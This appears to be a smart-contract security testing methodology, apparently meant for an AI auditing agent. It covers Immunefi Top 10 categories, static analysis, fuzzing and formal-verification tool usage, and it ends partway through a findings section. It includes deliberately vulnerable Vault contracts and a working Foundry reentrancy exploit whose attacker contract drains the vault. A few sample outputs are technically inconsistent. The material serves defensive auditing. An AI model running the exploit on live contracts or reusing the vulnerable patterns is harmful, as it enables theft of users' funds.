
## Methodology Overview

Web3 security testing identifies vulnerabilities in smart contracts, DeFi protocols, and blockchain applications through static analysis, symbolic execution, fuzzing, and manual code review, validated against real-world exploit patterns.

---

## Framework Integration

### DeFiHackLabs - Real-World Exploit Patterns

**Discovery:** `Glob: private/books/development/*smart-contract*` or use WebFetch for DeFiHackLabs
**Coverage:** Real DeFi exploit proof-of-concepts and analysis

**What DeFiHackLabs Provides:**
- Actual exploit reproductions from major hacks
- Foundry test cases showing attack mechanics
- Step-by-step attack walkthroughs
- Flash loan attack patterns
- Reentrancy exploit examples
- Oracle manipulation PoCs
- Access control bypass cases
- Real case studies (Beanstalk, BonqDAO, Omni, Wormhole, etc.)

**Use Case:** Learn attack patterns from real exploits to build testing strategies

---

### Immunefi Top 10 Smart Contract Vulnerabilities

**Reference:** https://immunefi.com/immunefi-top-10/ (use WebFetch)
**Coverage:** Universal vulnerability checklist for smart contract auditing

**Top 10 Vulnerabilities:**

**V01: Improper Input Validation**
- Oracle price feed validation
- Token transfer parameters
- Governance proposal parameters
- DeFi protocol collateral ratios
- Bridge cross-chain message validation

**V02: Incorrect Calculation**
- Interest/yield calculations
- Liquidation price calculations
- Reward distribution logic
- Fee calculations
- Token price calculations
- Slippage calculations
- Margin/collateral calculations

**V03: Oracle/Price Manipulation** ⚠️ HIGH IMPACT
- Flash loan attacks on price oracles
- Staleness checks on price feeds
- Multi-source oracle aggregation
- Time-weighted average price (TWAP) manipulation
- Read-only reentrancy on price queries
- Chainlink/Pyth/Band integration issues

**V04: Weak Access Control**
- Admin function access (pause, upgrade, configuration)
- Ownership transfer mechanisms
- Role-based access control (RBAC) bypasses
- Modifier bypass attempts
- Function visibility issues (public vs external)
- Proxy admin controls

**V05: Replay Attacks/Signature Malleability**
- Order signature verification
- Nonce management issues
- Cross-chain message replay protection
- Signature malleability (ECDSA vs Schnorr)
- Domain separator usage (EIP-712)
- Transaction uniqueness checks

**V06: Rounding Error**
- Small amount transfers
- Fee calculations with multiple decimals
- Share/token minting calculations
- Interest accrual
- Price conversions between tokens
- Division before multiplication

**V07: Reentrancy** 🔴 CRITICAL
- Token transfer callbacks (ERC-777, ERC-721, ERC-1155)
- External protocol integrations
- Withdrawal patterns
- Read-only reentrancy (view/pure functions)
- Cross-contract calls
- **CEI Pattern:** Checks-Effects-Interactions

**V08: Frontrunning**
- DEX order placement
- Liquidation opportunities
- Oracle updates
- NFT minting/purchases
- Governance voting
- Vault entry/exit
- **Note:** Varies by chain (Ethereum vs L2s)

**V09: Uninitialized Proxy**
- UUPS proxy initialization
- Transparent proxy initialization
- Beacon proxy initialization
- Implementation contract selfdestruct
- Storage collision
- Upgrade authorization checks

**V10: Governance Attacks**
- Flash loan attacks on voting power
- Vote delegation manipulation
- Timelock bypass
- Proposal execution validation
- Quorum threshold bypass
- Multi-sig wallet compromises

---

### Smart Contract Security Fundamentals

**Reference:** "Fundamentals of Smart Contracts Security" (use WebSearch)
**Pages:** 88 (9 chunks of 10 pages each)
**Coverage:** Solidity security, common vulnerabilities, best practices

---

## Blockchain Platforms Covered

### Primary: EVM-Compatible Chains
- **Ethereum** (Solidity)
- **Polygon, Binance Smart Chain, Avalanche, Arbitrum, Optimism** (EVM-compatible)
- **Testing Framework:** Foundry, Truffle
- **Tools:** Slither, Aderyn, Mythril, Echidna, Halmos

### Secondary: Alternative Platforms
- **Solana** (Rust) - Limited coverage in DeFiHackLabs
- **Starknet** (Cairo) - Need Caracal tool
- **Cosmos** (CosmWasm) - Need additional resources
- **Polkadot** (Ink!) - Need additional resources

**Methodology Focus:** EVM/Solidity primarily, extensible to other platforms

---

## Testing Methodology Structure

### EXPLORE Phase

1. **Scope Review**
   - Read SCOPE.md for target contracts
   - Identify blockchain platform (Ethereum, Polygon, etc.)
   - Understand contract addresses and versions
   - Review whitepaper/documentation
   - Identify third-party integrations (oracles, DEXs, bridges)

2. **Contract Reconnaissance**
   - Verify contract source on Etherscan/block explorer
   - Identify contract architecture (upgradeable, immutable)
   - Map contract interactions and dependencies
   - Review token standards used (ERC-20, ERC-721, etc.)
   - Identify admin functions and access controls

3. **Immunefi Top 10 Mapping**
   - Map contract functions to vulnerability categories
   - Identify oracle dependencies (V03 priority)
   - Flag external calls (reentrancy risk V07)
   - Review math operations (V02, V06)
   - Check access control patterns (V04)

4. **Exploit Pattern Research**
   - Search DeFiHackLabs for similar protocol exploits
   - Review historical hacks in same category (DEX, lending, staking)
   - Identify applicable attack patterns
   - Study relevant PoCs from DeFiHackLabs

### PLAN Phase

1. **Vulnerability Prioritization**
   - **Critical:** Oracle manipulation (if present), Reentrancy
   - **High:** Access control, Incorrect calculations, Flash loan vectors
   - **Medium:** Input validation, Rounding errors
   - **Low:** Gas optimization, Code quality

2. **Tool Inventory Check** (CRITICAL)
   - Review `/servers` for blockchain testing tools
   - Check for: Slither, Aderyn, Mythril, Echidna, Halmos, Foundry, Solhint
   - Identify missing tools (especially Caracal for Cairo)
   - Request deployment if needed
   - Verify node access (Infura, Alchemy, or local)

3. **Test Plan Generation**
   - Map Immunefi Top 10 to specific contract functions
   - Document testing approach:
     - Static analysis (Slither, Aderyn, Semgrep, Solhint)
     - Symbolic execution (Mythril, Halmos)
     - Fuzzing (Echidna, Foundry)
     - Manual review focus areas
   - Plan exploit PoC development (Foundry tests)
   - Get user approval before testing

### CODE Phase (Testing)

**Static Analysis:**

1. **Automated Scanning**
   - **Slither:** Comprehensive static analysis
   - **Aderyn:** Rust-based AST analysis
   - **Semgrep:** Pattern-based vulnerability detection
   - **Solhint:** Code quality and security linting
   - Document findings

2. **Manual Code Review**
   - Review access control modifiers
   - Analyze state-changing functions
   - Check for CEI pattern violations (reentrancy)
   - Review math operations for overflow/underflow
   - Validate input checks
   - Examine external call patterns

**Symbolic Execution & Formal Verification:**
- **Mythril:** Ethereum security scanner
- **Halmos:** Formal verification through symbolic testing
- Identify edge cases and assertion failures

**Fuzzing:**
- **Echidna:** Smart contract fuzzer
- **Foundry Fuzzing:** Property-based testing
- Generate invariant tests
- Test boundary conditions

**Dynamic Testing (Testnet/Mainnet Fork):**

1. **Reentrancy Testing**
   - Test callback points (ERC token hooks)
   - Verify CEI pattern enforcement
   - Test cross-contract reentrancy
   - Check read-only reentrancy

2. **Oracle Manipulation Testing**
   - Flash loan + price manipulation simulation
   - Test staleness checks
   - Verify TWAP resistance
   - Test multi-oracle aggregation

3. **Access Control Testing**
   - Test admin function access
   - Attempt ownership takeover
   - Test role hierarchy
   - Verify modifier enforcement

4. **Business Logic Testing**
   - Flash loan attack simulations
   - Liquidation manipulation
   - Governance voting exploits
   - Reward farming exploits

5. **Integration Testing**
   - Test interactions with external protocols
   - Verify cross-chain message handling
   - Test bridge security
   - DEX integration security

**Exploit PoC Development:**
- Write Foundry tests reproducing vulnerabilities
- Use DeFiHackLabs patterns as reference
- Demonstrate impact with concrete examples
- Include setup, exploit, and verification

**Evidence Collection:**
- Foundry test scripts (exploit PoCs)
- Transaction traces showing exploit
- Before/after balance comparisons
- Map findings to Immunefi Top 10

### COMMIT Phase (Reporting)

1. **Findings Documentation**
   - Executive summary
   - Technical findings mapped to Immunefi Top 10
   - Severity ratings (Critical, High, Medium, Low, Informational)
   - Working exploit PoCs (Foundry tests)
   - Impact analysis (potential funds at risk)

2. **Remediation Recommendations**
   - Specific code fixes
   - Reference OpenZeppelin secure patterns
   - Suggest audit scope for code changes
   - Best practices (CEI pattern, ReentrancyGuard, SafeMath)
   - Additional testing recommendations

3. **Framework Integration**
   - Map all findings to Immunefi Top 10 categories
   - Reference DeFiHackLabs similar exploits
   - Include real-world case studies
   - Provide detection strategies

---

## Common Smart Contract Vulnerabilities

### Critical Vulnerabilities
- **Reentrancy:** Unprotected external calls allowing state manipulation
- **Oracle Manipulation:** Flash loan attacks on price feeds
- **Access Control Bypass:** Unauthorized admin function calls
- **Integer Overflow/Underflow:** Math operations without SafeMath (Solidity <0.8.0)
- **Delegatecall to Untrusted Contract:** Arbitrary code execution

### High Severity
- **Front-running:** MEV exploitation opportunities
- **Signature Replay:** Cross-chain signature reuse
- **Uninitialized Proxy:** Implementation selfdestruct risk
- **Flash Loan Attacks:** Manipulation via large temporary capital
- **Governance Attacks:** Flash loan voting power manipulation

### Medium Severity
- **Incorrect Calculation:** Precision loss, rounding errors
- **Input Validation:** Missing bounds checks, overflow in user inputs
- **Gas Limit DoS:** Unbounded loops, high gas operations
- **Block Timestamp Manipulation:** Miner can manipulate timestamp
- **Centralization Risks:** Single admin key controls

### Informational
- **Code Quality:** Unused variables, missing events
- **Gas Optimization:** Inefficient storage patterns
- **Missing Documentation:** Undocumented functions
- **Deprecated Functions:** Use of deprecated Solidity features

---

## Testing Tools

**Static Analysis:**
- Slither (Trail of Bits) - Comprehensive Solidity analyzer
- Aderyn (Cyfrin) - Rust-based AST analyzer
- Semgrep - Pattern-based security scanner
- Solhint - Solidity linter (code quality)

**Symbolic Execution & Formal Verification:**
- Mythril - Security analysis framework
- Halmos - Formal verification with symbolic testing

**Fuzzing:**
- Echidna - Smart contract fuzzer
- Foundry - Built-in fuzzing capabilities
- Medusa - Parallelized fuzzer

**Development/Testing Frameworks:**
- Foundry - Fast, portable Ethereum testing framework
- Truffle - Smart contract development suite

**Formal Verification:**
- Certora - Formal verification platform
- K Framework - Formal specification and verification

**Blockchain Interaction:**
- Ethers.js / Web3.js - JavaScript libraries
- Cast (Foundry) - Command-line Ethereum tool
- Tenderly - Transaction simulation and debugging

---

## Tool Usage Guide

### Static Analysis Tools

#### 1. Slither - Comprehensive Solidity Analyzer

**Purpose:** Industry-standard static analysis tool - detects vulnerabilities, optimization issues, and code quality problems in Solidity contracts.

**Command - Basic Analysis:**
```bash
slither contracts/ --exclude-dependencies
```

**Options:**
- `--exclude-dependencies`: Skip analysis of imported libraries (OpenZeppelin, etc.)
- `--json report.json`: Output results in JSON format
- `--checklist`: Generate markdown audit checklist

**Expected Output:**
```
contracts/Vault.sol analyzed (1 contracts with 78 detectors), 45 result(s) found

Reentrancy in Vault.withdraw(uint256):
        External calls:
        - (success) = msg.sender.call{value: amount}()  (contracts/Vault.sol#52)
        State variables written after the call(s):
        - balances[msg.sender] -= amount  (contracts/Vault.sol#53)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-2

HIGH: Unprotected ether withdrawal in Vault.adminWithdraw()
     contracts/Vault.sol#78-80
     Anyone can call this function
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#functions-that-send-ether-to-arbitrary-destinations
```

**Parsing:**
- **Reentrancy finding** = **IMMUNEFI V07** (Critical) - State changed after external call
- **Unprotected ether withdrawal** = **IMMUNEFI V04** (Critical) - Missing access control
- Count HIGH/MEDIUM findings - prioritize for manual review

**Command - Specific Detector:**
```bash
slither contracts/ --detect reentrancy-eth,arbitrary-send-eth
```

**Common Detectors:**
- `reentrancy-eth`: Reentrancy vulnerabilities
- `arbitrary-send-eth`: Unprotected ether transfers
- `suicidal`: Unprotected selfdestruct
- `controlled-delegatecall`: Delegatecall to user-supplied address
- `tx-origin`: Dangerous use of tx.origin

**Command - Generate Report:**
```bash
slither contracts/ --print human-summary > slither-report.txt
```

**Parsing Report:**
- Focus on HIGH severity first
- Map findings to Immunefi Top 10
- Verify findings with manual review (false positives possible)

---

#### 2. Aderyn - Rust-Based AST Analyzer

**Purpose:** Modern static analyzer using Abstract Syntax Tree (AST) traversal - detects vulnerabilities through code structure analysis.

**Command - Analyze Contracts:**
```bash
aderyn contracts/
```

**Options:**
- Default output: Markdown report in current directory
- `--output report.json`: JSON format
- `--format sarif`: SARIF format (for CI/CD)

**Expected Output:**
```markdown
# Aderyn Analysis Report

## Summary
- **Total Issues Found:** 15
- **High Severity:** 4
- **Medium Severity:** 7
- **Low Severity:** 4

## Findings

### [H-1] Reentrancy Vulnerability in withdraw()
**Severity:** High
**Location:** contracts/Vault.sol:52-55
**Description:** External call to untrusted address before state changes

**Code:**
```solidity
function withdraw(uint256 amount) public {
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success);
    balances[msg.sender] -= amount;  // State change AFTER external call
}
```

**Recommendation:**
- Follow Checks-Effects-Interactions (CEI) pattern
- Use ReentrancyGuard from OpenZeppelin
- Update state before external calls

**References:**
- Immunefi V07: Reentrancy
- SWC-107: Reentrancy

### [H-2] Missing Access Control in adminWithdraw()
**Severity:** High
**Location:** contracts/Vault.sol:78-80
**Description:** Function allows anyone to withdraw contract funds

**Code:**
```solidity
function adminWithdraw() public {
    payable(msg.sender).transfer(address(this).balance);
}
```

**Recommendation:**
- Add onlyOwner modifier
- Implement role-based access control (RBAC)

**References:**
- Immunefi V04: Weak Access Control
```

**Parsing:**
- **High Severity** = Critical vulnerabilities requiring immediate fix
- **Location** = Exact file and line numbers
- **Code snippets** = Vulnerable code highlighted
- **Recommendations** = Specific remediation steps
- **References** = Maps to Immunefi Top 10 and SWC

**Why Use Aderyn:**
- **Complementary to Slither:** Different detection algorithms, catches different vulnerabilities
- **AST-based analysis:** Understands code structure, not just patterns
- **Active development:** Updated January 4, 2026 (Cyfrin maintains it)
- **No configuration:** Works with Foundry/Hardhat projects out of the box
- **Multiple formats:** Markdown for humans, JSON/SARIF for CI/CD

**Command - Integration with CI/CD:**
```bash
# GitHub Actions example
aderyn contracts/ --format sarif > aderyn-results.sarif
# Upload to GitHub Code Scanning
```

**Immunefi Mapping:** Detects V01 (Input Validation), V02 (Incorrect Calculation), V04 (Access Control), V07 (Reentrancy)

---

#### 3. Mythril - Symbolic Execution Security Scanner

**Purpose:** Symbolic execution tool for Ethereum - detects security vulnerabilities by exploring all possible execution paths.

**Command - Analyze Contract:**
```bash
myth analyze contracts/Vault.sol --solc-json mythril-config.json
```

**Options:**
- `--execution-timeout 300`: Max analysis time (5 minutes)
- `--max-depth 50`: Max recursion depth
- `--solc-json`: Solidity compiler config

**Expected Output:**
```
==== Integer Arithmetic Bugs ====
SWC ID: 101
Severity: High
Contract: Vault
Function name: withdraw(uint256)
PC address: 1234
Estimated Gas Usage: 2100 - 4200
The arithmetic operation can result in integer overflow.
--------------------
In file: contracts/Vault.sol:45

balance += amount

--------------------

==== Unprotected Ether Withdrawal ====
SWC ID: 105
Severity: High
Contract: Vault
Function name: adminWithdraw()
PC address: 5678
Anyone can withdraw ETH from the contract account.
Possible solutions:
Protect the function with access control modifiers.
--------------------
```

**Parsing:**
- **SWC ID 101** (Integer Overflow) = **IMMUNEFI V02** (Incorrect Calculation)
- **SWC ID 105** (Unprotected Withdrawal) = **IMMUNEFI V04** (Access Control)
- **Gas Usage** = Estimate of exploit cost

**Command - Quick Scan (Limited Depth):**
```bash
myth analyze contracts/Token.sol --max-depth 10 --execution-timeout 60
```

**Use Case:** Fast initial scan, reduce false positives with lower depth

---

#### 3. Semgrep - Pattern-Based Security Scanner

**Purpose:** Pattern-matching tool for detecting security anti-patterns - fast, customizable rules.

**Command - Smart Contract Security Rules:**
```bash
semgrep --config=p/smart-contracts contracts/
```

**Options:**
- `--config=p/smart-contracts`: Use smart contract ruleset
- `--json`: JSON output
- `--severity ERROR`: Only show high-severity findings

**Expected Output:**
```
contracts/Vault.sol
severity:error rule:solidity-security.nc-reentrancy
42: function withdraw(uint256 amount) public {
43:     (bool success, ) = msg.sender.call{value: amount}("");
44:     require(success);
45:     balances[msg.sender] -= amount;  // STATE CHANGE AFTER EXTERNAL CALL
46: }

contracts/Vault.sol
severity:warning rule:solidity-security.delegatecall-loop
78: for (uint i = 0; i < targets.length; i++) {
79:     targets[i].delegatecall(data[i]);  // DELEGATECALL IN LOOP
80: }
```

**Parsing:**
- **nc-reentrancy** = **IMMUNEFI V07** (Reentrancy) - Non-compliant with CEI pattern
- **delegatecall-loop** = **IMMUNEFI V04** (Access Control) - Dangerous pattern

**Command - Custom Rule:**
```bash
semgrep --config=custom-rules/ contracts/ --json > semgrep-results.json
```

**Custom Rule Example (detect tx.origin):**
```yaml
rules:
  - id: dangerous-tx-origin
    pattern: tx.origin
    message: "Use of tx.origin for authentication is dangerous"
    severity: ERROR
    languages: [solidity]
```

---

### Formal Verification

#### 4. Halmos - Symbolic Testing for Formal Verification

**Purpose:** Formal verification tool using symbolic testing - mathematically proves contract properties hold for ALL possible inputs.

**Command - Run Verification:**
```bash
halmos
```

**Options:**
- `--function testInvariant`: Verify specific function
- `--solver-timeout 300`: Set SMT solver timeout (seconds)
- `--loop 5`: Unroll loops up to 5 iterations
- `--depth 10`: Maximum symbolic execution depth

**Expected Output:**
```
[PASS] check_balance_never_negative(address) (paths: 15, time: 2.3s)
[PASS] check_total_supply_constant() (paths: 8, time: 1.1s)
[FAIL] check_no_price_manipulation() (paths: 42, time: 5.7s)
  Counterexample:
    user = 0x1234567890abcdef...
    amount = 115792089237316195423570985008687907853269984665640564039457584007913129639935

    Assertion failed: price should remain stable
    Initial price: 1000000000000000000 (1 ETH)
    Final price: 500000000000000000 (0.5 ETH)

Total: 2 passed, 1 failed
```

**Parsing:**
- **[PASS]** = Property verified for ALL inputs (mathematical proof)
- **[FAIL]** = Counterexample found (property can be violated)
- **paths** = Number of execution paths explored
- **time** = Verification time
- **Counterexample** = Specific inputs that break the property

**Test Example (Foundry-style):**
```solidity
// test/VaultFormal.t.sol
contract VaultFormalTest is Test {
    Vault public vault;

    function setUp() public {
        vault = new Vault();
    }

    // Halmos proves this for ALL users, ALL amounts
    function check_balance_never_negative(address user) public {
        uint256 balance = vault.balances(user);
        assert(balance >= 0);  // Always true (uint256 can't be negative)
    }

    // Halmos proves totalSupply NEVER changes
    function check_total_supply_constant() public {
        Token token = vault.token();
        uint256 supply1 = token.totalSupply();

        // ... arbitrary operations ...
        vault.deposit{value: 1 ether}();
        vault.withdraw(0.5 ether);

        uint256 supply2 = token.totalSupply();
        assert(supply1 == supply2);  // Proves supply is constant
    }

    // Halmos checks if price manipulation is possible
    function check_no_price_manipulation(uint256 amount) public {
        uint256 initialPrice = vault.getPrice();

        // Attacker actions
        vault.deposit{value: amount}();
        vault.withdraw(amount);

        uint256 finalPrice = vault.getPrice();

        // This may FAIL if price manipulation is possible
        assert(initialPrice == finalPrice);
    }

    // Invariant: User balance should never exceed contract balance
    function check_user_balance_bounded(address user) public {
        uint256 userBalance = vault.balances(user);
        uint256 contractBalance = address(vault).balance;
        assert(userBalance <= contractBalance);
    }
}
```

**Running Specific Checks:**
```bash
# Verify all checks
halmos

# Verify specific function only
halmos --function check_no_price_manipulation

# Increase solver timeout for complex properties
halmos --solver-timeout 600

# Parallel execution
halmos --parallel 4
```

**Halmos vs Traditional Fuzzing:**
| Aspect | Halmos (Formal Verification) | Echidna/Foundry (Fuzzing) |
|--------|------------------------------|---------------------------|
| Coverage | **Proves** for ALL inputs | Tests random sample |
| Certainty | **Mathematical proof** | High confidence (not proof) |
| Speed | Slower (SMT solver) | Fast (random generation) |
| Use Case | Critical invariants | General testing |
| Counterexamples | Exact failure case | One of many possible |

**When to Use Halmos:**
- **Critical DeFi protocols:** Lending (Aave, Compound), DEXs (Uniswap), Stablec oins (MakerDAO)
- **High-value contracts:** Protocols managing >$100M TVL
- **Invariant verification:** Properties that MUST hold (e.g., "total deposits == total withdrawals")
- **Pre-audit:** Before security audit to catch mathematical errors
- **Post-fix validation:** Prove fix eliminates vulnerability class entirely

**Example Use Cases:**
1. **Stablecoin peg:** Prove price always stays within 0.99-1.01 USD
2. **AMM constant product:** Prove `x * y = k` holds after all swaps
3. **Lending protocol:** Prove borrowers can never borrow more than collateral allows
4. **Vault accounting:** Prove `sum(user_balances) <= total_assets`

**Immunefi Mapping:** Verifies V02 (Incorrect Calculation), V03 (Oracle Manipulation), V06 (Rounding Error)

---

### Fuzzing Tools

#### 5. Echidna - Smart Contract Fuzzer

**Purpose:** Property-based fuzzer for Ethereum - generates random inputs to break invariants.

**Command - Run Fuzzing Campaign:**
```bash
echidna-test contracts/Vault.sol --contract Vault --config echidna.yaml
```

**Echidna Config (echidna.yaml):**
```yaml
testMode: assertion
testLimit: 10000
timeout: 600
deployer: "0x30000"
sender: ["0x10000", "0x20000", "0x30000"]
```

**Expected Output:**
```
Analyzing contract: Vault

echidna_test_balance_never_negative: failed!💥
  Call sequence:
    1. deposit{value: 1000}() from: 0x10000
    2. withdraw(2000) from: 0x10000
    3. Balance: -1000 (INVARIANT BROKEN)

Unique instructions: 1234
Unique codehashes: 1
Corpus size: 45
Seed: 123456789

echidna_test_admin_only: passed! ✅
```

**Parsing:**
- **Invariant broken** = **IMMUNEFI V02** (Incorrect Calculation) - Balance can go negative
- **Call sequence** = Exact steps to reproduce
- **Passed tests** = Properties that held under fuzzing

**Property Example (Solidity):**
```solidity
// contracts/Vault.sol
contract Vault {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public {
        balances[msg.sender] -= amount;  // BUG: No balance check
        payable(msg.sender).transfer(amount);
    }

    // Echidna property test
    function echidna_test_balance_never_negative() public view returns (bool) {
        return balances[msg.sender] >= 0;  // This will fail!
    }
}
```

**Command - Assertion Mode:**
```bash
echidna-test contracts/Token.sol --contract Token --test-mode assertion
```

**Use Case:** Test specific assertions (e.g., totalSupply should never decrease)

---

#### 5. Foundry (forge) - Testing Framework

**Purpose:** Fast, portable Ethereum testing framework - compile, test, fuzz, and deploy contracts.

**Command - Compile Contracts:**
```bash
forge build
```

**Expected Output:**
```
[⠊] Compiling...
[⠊] Compiling 15 files with 0.8.20
[⠊] Solc 0.8.20 finished in 1.23s
Compiler run successful!
```

**Command - Run Tests:**
```bash
forge test -vvv
```

**Options:**
- `-v`: Verbosity (stack traces)
- `-vv`: Show logs
- `-vvv`: Show test execution traces
- `-vvvv`: Show full traces
- `--match-test testReentrancy`: Run specific test

**Expected Output:**
```
Running 5 tests for test/Vault.t.sol:VaultTest
[PASS] testDeposit() (gas: 28503)
[PASS] testWithdraw() (gas: 45234)
[FAIL. Reason: Reentrancy detected] testReentrancyAttack() (gas: 89456)
    Logs:
      Attacker balance before: 0
      Attacker balance after: 2000000000000000000 (2 ETH)
      Vault balance: 0 (DRAINED)

Test result: FAILED. 2 passed; 1 failed; finished in 1.05s
```

**Parsing:**
- **[FAIL]** = Exploit successful - reentrancy vulnerability confirmed
- **Gas usage** = Cost to execute attack
- **Logs** = Evidence of exploit (balance changes)

**Command - Fuzz Testing:**
```bash
forge test --match-test testFuzz -vvv
```

**Fuzz Test Example:**
```solidity
// test/Vault.t.sol
function testFuzz_WithdrawAmount(uint256 amount) public {
    vm.assume(amount > 0 && amount < 100 ether);

    // Setup
    vm.deal(address(vault), 100 ether);
    vault.deposit{value: amount}();

    // Test
    uint256 balanceBefore = address(this).balance;
    vault.withdraw(amount);
    uint256 balanceAfter = address(this).balance;

    // Assertion
    assertEq(balanceAfter - balanceBefore, amount);
}
```

**Command - Coverage:**
```bash
forge coverage --report lcov
genhtml lcov.info -o coverage/
```

**Use Case:** Identify untested code paths that may hide vulnerabilities

**Command - Mainnet Fork Testing:**
```bash
forge test --fork-url https://eth-mainnet.g.alchemy.com/v2/YOUR-KEY --match-test testFlashLoan
```

**Exploit PoC Example:**
```solidity
// test/exploits/ReentrancyExploit.t.sol
contract ReentrancyExploitTest is Test {
    Vault public vault;
    Attacker public attacker;

    function setUp() public {
        vault = new Vault();
        attacker = new Attacker(address(vault));

        // Fund vault
        vm.deal(address(vault), 10 ether);
    }

    function testReentrancyExploit() public {
        // Initial state
        assertEq(address(vault).balance, 10 ether);
        assertEq(address(attacker).balance, 0);

        // Execute attack
        attacker.attack{value: 1 ether}();

        // Verify exploit
        assertEq(address(vault).balance, 0, "Vault should be drained");
        assertEq(address(attacker).balance, 11 ether, "Attacker stole funds");
    }
}

contract Attacker {
    Vault public vault;
    uint public attackCount;

    constructor(address _vault) {
        vault = Vault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether && attackCount < 10) {
            attackCount++;
            vault.withdraw(1 ether);  // REENTRANCY
        }
    }
}
```

---

#### 6. Cast - Command-Line Blockchain Tool

**Purpose:** Swiss army knife for Ethereum - query contracts, send transactions, decode data.

**Command - Get Balance:**
```bash
cast balance 0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb --rpc-url $ETH_RPC_URL
```

**Expected Output:**
```
1234567890000000000 (1.23456789 ETH)
```

**Command - Call Contract (Read):**
```bash
cast call 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 "balanceOf(address)(uint256)" 0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb --rpc-url $ETH_RPC_URL
```

**Expected Output:**
```
0x00000000000000000000000000000000000000000000000000000000075bcd15
# Decoded: 123456789 (123.456789 USDC with 6 decimals)
```

**Parsing:**
- Convert hex to decimal
- Account for token decimals (USDC = 6, DAI = 18)

**Command - Send Transaction:**
```bash
cast send 0xCONTRACT "withdraw(uint256)" 1000000000000000000 --private-key $PRIVATE_KEY --rpc-url $ETH_RPC_URL
```

**Expected Output:**
```
blockHash               0xabcd1234...
blockNumber             12345678
from                    0x742d35Cc...
gasUsed                 45234
status                  1 (success)
transactionHash         0xef567890...
```

**Command - Decode Transaction Input:**
```bash
cast 4byte-decode 0xa9059cbb000000000000000000000000742d35cc6634c0532925a3b844bc9e7595f0beb0000000000000000000000000000000000000000000000000de0b6b3a7640000
```

**Expected Output:**
```
transfer(address,uint256)
  [0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb, 1000000000000000000]
# Transfer 1 ETH to address
```

**Use Case:** Analyze suspicious transactions, decode attacker actions

**Command - Estimate Gas:**
```bash
cast estimate 0xCONTRACT "swap(uint256)" 1000000 --rpc-url $ETH_RPC_URL
```

**Expected Output:**
```
123456 (gas units)
```

**Command - Get Transaction Receipt:**
```bash
cast receipt 0xTRANSACTION_HASH --rpc-url $ETH_RPC_URL
```

**Use Case:** Analyze exploit transactions, understand attack flow

---

### Code Quality & Linting

#### 7. Solhint - Solidity Linter

**Purpose:** Code quality and security linter for Solidity - catch common mistakes and anti-patterns.

**Command - Lint Contracts:**
```bash
solhint 'contracts/**/*.sol'
```

**Expected Output:**
```
contracts/Vault.sol
  52:5   error    State variable after external call (reentrancy)                                reentrancy
  78:5   warning  Visibility modifier is not set (should be public/external/internal/private)   visibility
  120:10 warning  Use of deprecated 'now' keyword, use 'block.timestamp' instead                no-deprecated-now

✖ 3 problems (1 error, 2 warnings)
```

**Parsing:**
- **error: reentrancy** = **IMMUNEFI V07** - Manual review required
- **warning: visibility** = Code quality issue
- **warning: no-deprecated-now** = Use modern Solidity features

**Command - Custom Rules:**
```bash
solhint 'contracts/**/*.sol' --config .solhint.json
```

**Config Example (.solhint.json):**
```json
{
  "extends": "solhint:recommended",
  "rules": {
    "compiler-version": ["error", "^0.8.0"],
    "func-visibility": ["error", {"ignoreConstructors": true}],
    "reentrancy": "error",
    "no-unused-vars": "warning"
  }
}
```

---

### Transaction Debugging

#### 8. Tenderly - Transaction Simulation & Debugging

**Purpose:** Debug and simulate transactions - visualize execution flow, gas usage, state changes.

**Command - Simulate Transaction (via API):**
```bash
curl https://api.tenderly.co/api/v1/account/YOUR_ACCOUNT/project/YOUR_PROJECT/simulate \
  -X POST \
  -H "Content-Type: application/json" \
  -H "X-Access-Key: YOUR_KEY" \
  -d '{
    "network_id": "1",
    "from": "0xATTACKER_ADDRESS",
    "to": "0xVAULT_ADDRESS",
    "input": "0xa9059cbb...",
    "gas": 500000,
    "gas_price": "30000000000",
    "value": "0"
  }'
```

**Expected Output:**
```json
{
  "transaction": {
    "status": true,
    "gas_used": 123456
  },
  "simulation": {
    "id": "abc-123-def"
  }
}
```

**Use Case:**
- Test exploit without sending real transaction
- Debug failed transactions from block explorers
- Visualize state changes during reentrancy attacks

**Web UI Features:**
- Step-through debugger
- State diff viewer
- Gas profiler
- Call trace visualizer

---

## Tool Command Summary

| Tool | Primary Use | Vulnerability Detection | Difficulty |
|------|-------------|------------------------|------------|
| Slither | Static analysis | Reentrancy, Access Control, Math | Easy |
| Aderyn | Static analysis | AST-based vulnerability detection | Easy |
| Mythril | Symbolic execution | Integer issues, Unprotected calls | Medium |
| Halmos | Formal verification | Invariants, mathematical properties | Medium |
| Semgrep | Pattern matching | Custom security patterns | Easy |
| Echidna | Fuzzing | Invariant violations | Medium |
| Foundry | Testing & fuzzing | All (via test cases) | Medium |
| Cast | Blockchain interaction | N/A (utility tool) | Easy |
| Solhint | Linting | Code quality, basic security | Easy |
| Tenderly | Transaction debugging | Post-exploit analysis | Easy |

---

## Workflow Integration Example

**Complete Smart Contract Audit Workflow:**

```bash
# 1. Static Analysis (Fast Tools First)
slither contracts/ --json slither-report.json
aderyn contracts/
semgrep --config=p/smart-contracts contracts/

# 2. Code Quality Linting
solhint 'contracts/**/*.sol'

# 3. Symbolic Execution & Formal Verification
myth analyze contracts/Vault.sol --max-depth 50
halmos --function testInvariant

# 4. Compile & Test
forge build
forge test -vvv

# 5. Fuzz Testing
echidna-test contracts/Vault.sol --contract Vault
forge test --match-test testFuzz

# 6. Coverage
forge coverage --report lcov

# 7. Mainnet Fork Testing (if applicable)
forge test --fork-url $ETH_RPC_URL --match-test testFlashLoan

# 8. Manual Review + Exploit PoC Development
# Write Foundry tests for discovered vulnerabilities
forge test --match-test testReentrancyExploit -vvvv
```

**Result:** Comprehensive analysis covering static analysis, dynamic testing, fuzzing, formal verification, and exploit validation.

---

## Common Smart Contract Findings

### Finding 1: Reentrancy Vulnerability (Critical)

**Immunefi Classification:** V07 - Reentrancy
**Severity:** Critical
**Likelihood:** High (if external calls present)
**Impact:** Complete fund drainage

#### Detection

**Slither Output:**
```
Reentrancy in Vault.withdraw(uint256):
    External calls:
